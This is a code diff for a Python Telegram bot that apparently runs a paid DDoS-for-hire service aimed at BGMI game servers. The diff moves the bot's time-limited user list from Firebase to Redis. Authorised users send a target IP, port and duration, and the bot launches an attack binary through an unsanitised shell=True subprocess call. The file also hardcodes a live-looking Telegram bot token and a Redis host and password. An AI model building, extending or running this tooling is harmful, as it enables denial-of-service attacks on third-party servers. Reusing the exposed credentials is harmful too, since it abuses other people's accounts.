@@ -11,29 +11,25 @@ import time
 import logging
 import socket
 import pytz  # Import pytz for timezone handling
-import firebase_admin
-from firebase_admin import credentials, firestore
-
-# Path to your Firebase Admin SDK JSON file
-cred = credentials.Certificate('admin.json')
-firebase_admin.initialize_app(cred)
-
-# Initialize Firestore
-db = firestore.client()
 
 bot = telebot.TeleBot('7858493439:AAGbtHzHHZguQoJzAney4Ccer1ZUisC-bDI')
 
 # Admin user IDs
 admin_id = ["7418099890"]
 admin_owner = ["7418099890"]
-os.system('chmod +x *')
 
 # File to store allowed user IDs and their expiration times
 USER_FILE = "users.txt"
 cooldown_timestamps = {}
 # File to store command logs
-LOG_FILE = "log.txt"
+import redis
+import redis
 
+redis_client = redis.Redis(
+  host='redis-19547.c330.asia-south1-1.gce.redns.redis-cloud.com',
+  port=19547,
+  password='9lKTBrMRnxCOkjOtaHNPsXNQo0OaoibV')
+# Initialize Redis client
 # Set Indian Standard Time (IST)
 IST = pytz.timezone('Asia/Kolkata')
 
@@ -41,38 +37,35 @@ IST = pytz.timezone('Asia/Kolkata')
 AK_BIN_PATH = 'KALUAA'
 
 # Function to read user IDs and their expiration times from the file
+# Function to read users from Redis
 def read_users():
-    users_ref = db.collection('users')
-    docs = users_ref.stream()
     users = {}
-    for doc in docs:
-        data = doc.to_dict()
-        expiration_time = datetime.fromisoformat(data['expiration']).astimezone(IST)
-        users[doc.id] = expiration_time
+    for key in redis_client.scan_iter("user:*"):
+        user_id = key.split(":")[1]
+        expiration_time = redis_client.get(key)
+        if expiration_time:
+            users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
     return users
 
-# Function to save users to file
+# Function to save a user to Redis
 def save_user(user_id, expiration_time):
-    users_ref = db.collection('users')
-    users_ref.document(user_id).set({
-        'expiration': expiration_time.isoformat()
-    })
+    redis_client.set(f"user:{user_id}", expiration_time.isoformat())
+    redis_client.expireat(f"user:{user_id}", expiration_time.timestamp())  # Set TTL
 
 # Function to remove expired users
 def remove_expired_users():
-    users_ref = db.collection('users')
+    # Remove users manually only if necessary (optional)
     current_time = datetime.now(IST)
-    docs = users_ref.stream()
-    for doc in docs:
-        data = doc.to_dict()
-        expiration_time = datetime.fromisoformat(data['expiration']).astimezone(IST)
-        if expiration_time <= current_time:
-            users_ref.document(doc.id).delete()
-
+    for key in redis_client.scan_iter("user:*"):
+        expiration_time = redis_client.get(key)
+        if expiration_time:
+            exp_time = datetime.fromisoformat(expiration_time).astimezone(IST)
+            if exp_time <= current_time:
+                redis_client.delete(key)
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
-    remove_expired_users()  # Check for expired users
+    remove_expired_users()
     user_id = str(message.chat.id)
     if user_id in admin_owner:
         command = message.text.split()
@@ -80,18 +73,12 @@ def add_user(message):
             user_to_add = command[1]
             minutes = int(command[2])
             expiration_time = datetime.now(IST) + timedelta(minutes=minutes)
-            
-            users = read_users()
-            if user_to_add not in users:
-                save_user(user_to_add, expiration_time)
-                response = f"User {user_to_add} added successfully with expiration time of {minutes} minutes."
-            else:
-                response = "User already exists."
+            save_user(user_to_add, expiration_time)
+            response = f"User {user_to_add} added successfully with expiration time of {minutes} minutes."
         else:
             response = "Please specify a user ID and the expiration time in minutes."
     else:
         response = "Only Admin Can Run This Command."
-
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['remove'])
@@ -101,10 +88,9 @@ def remove_user(message):
         command = message.text.split()
         if len(command) == 2:
             user_to_remove = command[1]
-            users = read_users()
-            if user_to_remove in users:
-                del users[user_to_remove]
-                save_users(users)
+            redis_key = f"user:{user_to_remove}"
+            if redis_client.exists(redis_key):  # Check if user exists in Redis
+                redis_client.delete(redis_key)  # Delete user from Redis
                 response = f"User {user_to_remove} removed successfully."
             else:
                 response = "User not found."
@@ -112,22 +98,23 @@ def remove_user(message):
             response = "Please specify a user ID to remove."
     else:
         response = "Only Admin Can Run This Command."
-
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
-    remove_expired_users()  # Check for expired users
     user_id = str(message.chat.id)
     if user_id in admin_owner:
-        users = read_users()
+        users = read_users()  # Fetch from Redis
         response = "Authorized Users:\n"
         current_time = datetime.now(IST)
-        
-        if users:
-            for user_id, exp_time in users.items():
-                if exp_time > current_time:
-                    response += f"- {user_id} (Expires at: {exp_time})\n"
+
+        active_users = [
+            user_id for user_id, exp_time in users.items() if exp_time > current_time
+        ]
+
+        if active_users:
+            for user_id in active_users:
+                response += f"- {user_id} (Expires at: {users[user_id]})\n"
         else:
             response = "No active users found."
     else:
@@ -159,7 +146,7 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
     bot.reply_to(message, response)
 
-    full_command = f"./sasuke {target} {port} {time} 60"
+    full_command = f"./kaluayt {target} {port} {time}"
     try:
         print(f"Executing command: {full_command}")  # Log the command
         result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
